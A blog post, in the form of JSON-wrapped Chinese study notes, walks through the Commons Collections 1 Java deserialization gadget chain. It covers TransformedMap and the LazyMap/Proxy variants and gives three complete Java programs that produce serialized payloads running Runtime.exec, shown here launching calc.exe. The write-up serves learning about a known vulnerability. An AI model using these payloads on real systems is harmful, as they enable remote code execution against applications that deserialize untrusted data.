{"title":"Java反序列化2笔记","uid":"40de76659604bae52b4863ba88be567d","slug":"Java反序列化2笔记","date":"2022-09-05T11:58:43.000Z","updated":"2022-09-06T04:28:09.026Z","comments":true,"path":"api/articles/Java反序列化2笔记.json","keywords":null,"cover":null,"content":"<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p>p牛 Java安全漫谈 9 10 11反序列化3 4 5：</p>\n<p><a href=\"https://t.zsxq.com/05MzN7miq\">https://t.zsxq.com/05MzN7miq</a></p>\n<p><a href=\"https://t.zsxq.com/05AAAEYVN\">https://t.zsxq.com/05AAAEYVN</a></p>\n<p><a href=\"https://t.zsxq.com/05VVRfAea\">https://t.zsxq.com/05VVRfAea</a></p>\n<p>前面了解了反序列化利用基础，和URLDNS利用链</p>\n<p>接下来学习，Common Collections 1 利用链</p>\n<h1 id=\"Common-Collections-1\"><a href=\"#Common-Collections-1\" class=\"headerlink\" title=\"Common Collections 1\"></a>Common Collections 1</h1><h2 id=\"环境：\"><a href=\"#环境：\" class=\"headerlink\" title=\"环境：\"></a>环境：</h2><p>eclipse，下载3.1版本的Common Collections jar文件</p>\n<p><a href=\"https://nowjava.com/jar/detail/m02261225/commons-collections-3.1.jar.html\">https://nowjava.com/jar/detail/m02261225/commons-collections-3.1.jar.html</a></p>\n<p>在build path的设置中添加该jar文件，之后选用并且应用它</p>\n<p>同时为了在eclipse中调试方便，还需要下载Common Collections sources jar包同时导入</p>\n<p>在修改打开源代码路径为Common Collections sources jar  就能够查看源代码了</p>\n<p>根据漫谈中的简化版cc1利用链demo代码，运行后能够成功弹出计算器</p>\n<h2 id=\"原理：\"><a href=\"#原理：\" class=\"headerlink\" title=\"原理：\"></a>原理：</h2><p>利用common collection 中的transfromer构造利用链</p>\n<h3 id=\"TransformedMap\"><a href=\"#TransformedMap\" class=\"headerlink\" title=\"TransformedMap\"></a>TransformedMap</h3><p>用于修饰map，被修饰的map在使用put添加新元素时会执行一个回调</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Map outerMap &#x3D; TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);  </code></pre>\n\n<p>对innermap进行修饰，设置一个处理新元素key的回调和一个处理</p>\n<p>新元素value的回调，回调指的是实现transformer接口的类，之后返回修饰好的outerMap</p>\n<h3 id=\"Transformer\"><a href=\"#Transformer\" class=\"headerlink\" title=\"Transformer\"></a>Transformer</h3><p>是一个接口，接口里面只有一个待实现方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public interface Transformer &#123;\n\n\tpublic Object transform(Object input);\n\n&#125;  </code></pre>\n\n<p>TransformedMap在转换Map新元素调用tansform方法，过程类似于调用回调函数，这个函数的参数是原始对象。</p>\n<h3 id=\"ConstantTransformer\"><a href=\"#ConstantTransformer\" class=\"headerlink\" title=\"ConstantTransformer\"></a>ConstantTransformer</h3><p>是实现Transformer接口的一个类，它的过程就是在构造函数的时候传入一个对象，在tansform方法将对象在返回</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"> public ConstantTransformer(Object constantToReturn) &#123;\n\n\t super(); \n     iConstant &#x3D; constantToReturn; \n\n&#125; \n\npublic Object transform(Object input) &#123;\n\n \treturn iConstant; \n\n&#125;  </code></pre>\n\n<p> 所以他的作⽤其实就是包装任意⼀个对象，在执行回调时返回这个对象，进而方便后续操作。  </p>\n<h3 id=\"InvokerTransformer\"><a href=\"#InvokerTransformer\" class=\"headerlink\" title=\"InvokerTransformer\"></a>InvokerTransformer</h3><p>是一个实现Transformer接口的类，可以用来执行任意方法，是反序列化能执行任意代码的关键</p>\n<p>实例化时需要传入三个参数，第一个是待执行的方法名，第二个是这个函数的参数列表的参数类型，第三个是传给这个函数的参数列表</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; \n\n\tsuper();\n\n\tiMethodName &#x3D; methodName; \n\n\tiParamTypes &#x3D; paramTypes; iArgs &#x3D; args; \n\n&#125;  </code></pre>\n\n<p>后面回调Transform方法，执行input对象的iMethodName方法</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public Object transform(Object input) &#123; \n\n\tif (input &#x3D;&#x3D; null) &#123; \n\n\t\treturn null; \n\n\t&#125;\n\n \ttry &#123; \n\n\t\tClass cls &#x3D; input.getClass(); \n\n\t\tMethod method &#x3D; cls.getMethod(iMethodName, iParamTypes); \n\n\t\treturn method.invoke(input, iArgs); \n\n\t&#125; catch (NoSuchMethodException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; does not exist&quot;);\n\n\t &#125; catch (IllegalAccessException ex) &#123;  \n\n \t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t\t+ \tinput.getClass() + &quot;&#39; cannot be accessed&quot;); \n\n\t&#125; catch (InvocationTargetException ex) &#123; \n\n\t\tthrow new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; \t\t\t \t+ \tinput.getClass() + &quot;&#39; threw an exception&quot;, ex); \n\n\t&#125; \n\n&#125;  </code></pre>\n\n\n\n<h3 id=\"ChainedTransformer\"><a href=\"#ChainedTransformer\" class=\"headerlink\" title=\"ChainedTransformer\"></a>ChainedTransformer</h3><p>是一个实现Transformer接口的类，作用是将内部的Transformer串在一起。将前面一个回调的执行结果当作后一个回调的参数传入</p>\n<pre class=\"line-numbers language-Java\" data-language=\"Java\"><code class=\"language-Java\">public ChainedTransformer(Transformer[] transformers) &#123; \n\n\tsuper(); \n\n\tiTransformers &#x3D; transformers; \n\n&#125; \n\npublic Object transform(Object object) &#123; \n\n\tfor (int i &#x3D; 0; i &lt; iTransformers.length; i++) &#123; \n\n\t\tobject &#x3D; iTransformers[i].transform(object); \n\n\t&#125; \n    return object;\n\n &#125;  </code></pre>\n\n\n\n<h2 id=\"TransformedMap-1\"><a href=\"#TransformedMap-1\" class=\"headerlink\" title=\"TransformedMap\"></a>TransformedMap</h2><p>使用ChainedTransformer将ConstantTransformer和InvokerTransformer串联起来，其中ConstantTransformer获取当前环境的Runtime对象，InvokerTransformer执行Runtime对象的exec方法，参数是当前计算机程序的位置</p>\n<p>将其作为innermap的TransformerMap修饰</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Map innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);</code></pre>\n\n<p>这个修饰无论是当作key修饰还是value修饰，还是两个修饰都是，都只会触发一次弹出一次计算器</p>\n<p>前面说过，当这个修饰的map添加新元素时就会触发回调</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);</code></pre>\n\n<p>所以添加一个新元素，就会执行回调，获取Runtime对象，在执行exec方法调用计算器</p>\n<h3 id=\"完整代码：\"><a href=\"#完整代码：\" class=\"headerlink\" title=\"完整代码：\"></a>完整代码：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class CommonCollections1 &#123;\n\t public static void main(String[] args) throws Exception &#123;\n\t\t Transformer[] transformers &#x3D; new Transformer[]&#123;\n\t\t\t\t new ConstantTransformer(Runtime.getRuntime()),\n\t\t\t\t new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\t new Object[]\n\t\t\t\t\t\t\t\t &#123;&quot;C:\\\\Windows\\\\SysWOW64\\\\calc.exe&quot;&#125;),\n\t\t &#125;;\n\t\t Transformer transformerChain &#x3D; new\n\t\t\t\t \tChainedTransformer(transformers);\n\t\t Map innerMap &#x3D; new HashMap();\n\t\t Map outerMap &#x3D; TransformedMap.decorate(innerMap, null,transformerChain);\n\t\t outerMap.put(&quot;test&quot;, &quot;xxxx&quot;);\n\n\n\t &#125;\n\t\n&#125;\n</code></pre>\n\n\n\n<h2 id=\"反序列化利用\"><a href=\"#反序列化利用\" class=\"headerlink\" title=\"反序列化利用\"></a>反序列化利用</h2><p>环境：小于jdk 8u71</p>\n<p>前面的demo只能在本地运行测试，而要真正利用则需要将其生成序列化数据</p>\n<p>demo的核心是利用put操作，让其执行回调，实际反序列化时需要找到一个类其readObject方法里又类似于写入的操作</p>\n<h3 id=\"sun-reflect-annotation-AnnotationInvocationHandler\"><a href=\"#sun-reflect-annotation-AnnotationInvocationHandler\" class=\"headerlink\" title=\"sun.reflect.annotation.AnnotationInvocationHandler\"></a>sun.reflect.annotation.AnnotationInvocationHandler</h3><p>这个类的readObject方法，会遍历反序列化得到的map的所有元素，并将其依次设置值，在执行这个操作时，就会触发回调</p>\n<p>因为该类是jdk内部的类，不能直接实例化，所以通过反射调用它</p>\n<pre class=\"line-numbers language-Java\" data-language=\"Java\"><code class=\"language-Java\">Class clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\nConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\nconstruct.setAccessible(true);\n\nObject obj &#x3D; construct.newInstance(Retention.class, outerMap);</code></pre>\n\n<p>AnnotationInvocationHandler类的构造函数有两个参数，第一个参数是一个Annotation类；第二个是参数就是前面构造的Map。  </p>\n<p>在反序列化测试时发现，Runtime报错，原因是Runtime类没有实现 java.io.Serializable  接口，所以需要将其改为通过反射调用，这个得到的是一个class对象，这个java.lang.class实现了java.io.Serializable接口就能正常序列化。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Transformer[] transformers &#x3D; new Transformer[]&#123;\t\n\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, \t\t\t\t\t\t\t\t\t\t  new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, \n                                       new Object[] &#123; null, new Object[0] &#125;),\n\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\n\t\t\t\tnew String[] &#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\n&#125;;</code></pre>\n\n<p>再次反序列化输出了反序列化数据，但是不能正常弹计算器</p>\n<p>这是由于AnnotationInvocationHandler类的readObject方法中有个if判断，只有当var7不为空时才会执行setValue操作，才能正常触发回调</p>\n<p>条件：</p>\n<ol>\n<li> sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X  </li>\n<li> 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素  </li>\n</ol>\n<p>所以前面使用了Retention.class，它有一个value方法，所以在innermap时，需要传入一个key为value的元素</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">inner.put(&quot;value&quot;,&quot;xxx&quot;);</code></pre>\n\n<p>这样就保证执行了setValue操作</p>\n<p>再运行就能成功弹出计算器，在小于jdk8u71的情况下。在大于等于8u71时无法弹出。</p>\n<p>大于8u71时无法弹出是因为修改了这个类的readObject方法，反序列化后得到的map不直接使用，而是新建一个LinkedHashMap对象，将原来的键值添加进去，后续对map的操作是基于这个LinkedHashMap对象，而这个对象并没有以前map的修饰，所以在对LinkedHashMap对象进行set和put时，也就无法触发原来map上的回调。</p>\n<h3 id=\"完整代码：-1\"><a href=\"#完整代码：-1\" class=\"headerlink\" title=\"完整代码：\"></a>完整代码：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonCollections1next &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tinnerMap.put(&quot;value&quot;, &quot;xxxx&quot;);\n\t\tMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,\n\t\t\t\ttransformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\tObject obj &#x3D; construct.newInstance(Retention.class, outerMap);\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(obj);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\t\t\t\n\t&#125;\n&#125;</code></pre>\n\n\n\n<h2 id=\"LazyMap\"><a href=\"#LazyMap\" class=\"headerlink\" title=\"LazyMap\"></a>LazyMap</h2><p>环境：</p>\n<p>小于jdk8u71</p>\n<p>在yso中没有使用TransformedMap而是使用LazyMap，LazyMap与TransformedMap的不同点在于，LazyMap是通过get方法执行put操作，在执行get方法输入一个不存在的key值时会默认调用put方法，这样就能执行回调。</p>\n<p>而在AnnotationInvocationHandler类的invoke方法中正好有使用到get方法。</p>\n<p>yso中利用java对象代理 java.reflect.Proxy 来劫持AnnotationInvocationHandler的某个对象</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\t\t&#123;Map.class&#125;, handler);  </code></pre>\n\n<p>第一个参数使用默认，第二个参数是需要代理的对象集合，第三个参数是实现了InvocationHandler 接口的对象，里面有代理的逻辑。</p>\n<p>AnnotationInvocationHandler类就是一个InvocationHandler，所以对它进行代理，在readObject方法中只要调用了任意方法就会导致执行LazyMap的get方法。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">InvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\n Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\n                                             &#123;Map.class&#125;, handler);  </code></pre>\n\n<p>代理的对象是一个Map需要将其转化为AnnotationInvocationHandler，因为要执行的是AnnotationInvocationHandler的readObject方法。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">handler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\tproxyMap);</code></pre>\n\n<p>接下来就是正常的序列化和反序列化了</p>\n<p>yso中在transformer数组的最后还添加了一个 ConstantTransformer(1)，它的作用是隐藏程序运行爆出的进程启动信息。</p>\n<h3 id=\"完整利用：\"><a href=\"#完整利用：\" class=\"headerlink\" title=\"完整利用：\"></a>完整利用：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\npublic class CommonCollections1Lazy &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\t\n\t\tInvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\t\t&#x2F;&#x2F;进行proxy\n\t\tMap proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new\n\t\t\t\tClass[] &#123;Map.class&#125;, handler);\n\t\t&#x2F;&#x2F;用AnnotationInvocationHandler对这个proxyMap进行包裹\n\t\thandler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\t\tproxyMap);\n\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(handler);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t\t\n\t\t\n\t&#125;\n&#125;</code></pre>\n\n\n\n","text":"参考资料：p牛 Java安全漫谈 9 10 11反序列化3 4 5： https://t.zsxq.com/05MzN7miq https://t.zsxq.com/05AAAEYVN https://t.zsxq.com/05VVRfAea 前面了解了反序列化利用基础，和URL...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":23,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Common-Collections-1\"><span class=\"toc-text\">Common Collections 1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%EF%BC%9A\"><span class=\"toc-text\">环境：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86%EF%BC%9A\"><span class=\"toc-text\">原理：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#TransformedMap\"><span class=\"toc-text\">TransformedMap</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Transformer\"><span class=\"toc-text\">Transformer</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ConstantTransformer\"><span class=\"toc-text\">ConstantTransformer</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#InvokerTransformer\"><span class=\"toc-text\">InvokerTransformer</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ChainedTransformer\"><span class=\"toc-text\">ChainedTransformer</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#TransformedMap-1\"><span class=\"toc-text\">TransformedMap</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">完整代码：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">反序列化利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#sun-reflect-annotation-AnnotationInvocationHandler\"><span class=\"toc-text\">sun.reflect.annotation.AnnotationInvocationHandler</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A-1\"><span class=\"toc-text\">完整代码：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#LazyMap\"><span class=\"toc-text\">LazyMap</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%EF%BC%9A\"><span class=\"toc-text\">完整利用：</span></a></li></ol></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化3笔记","uid":"cc6f53e8dc634d13d7c94fb0decfd921","slug":"Java反序列化3笔记","date":"2022-09-11T09:54:16.000Z","updated":"2022-09-11T10:28:25.262Z","comments":true,"path":"api/articles/Java反序列化3笔记.json","keywords":null,"cover":[],"text":" 参考资料：p牛 Java安全漫谈 12 Java反序列化6 https://t.zsxq.com/05vVVfAeI Common Collection6前面学习cc1的时候发现cc1有版本限制问题，所以这个阶段来解决版本限制问题，一种通用的反序列化链，也就是cc6 Annot...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":23,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化1笔记","uid":"ef40a0cd7170df96b7fe2fe93ccaa11e","slug":"Java反序列化1笔记","date":"2022-09-05T11:53:13.000Z","updated":"2022-09-10T07:34:11.423Z","comments":true,"path":"api/articles/Java反序列化1笔记.json","keywords":null,"cover":null,"text":"参考资料：p牛 Java安全漫谈7 8 反序列化1 2 https://t.zsxq.com/05QrVnMBy https://t.zsxq.com/053zvFeAu Java反序列化利用基础在Java 中，主要是通过 writeobject写入序列化数据到stream 并将...","link":"","photos":[],"count_time":{"symbolsCount":"2.7k","symbolsTime":"2 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":23,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}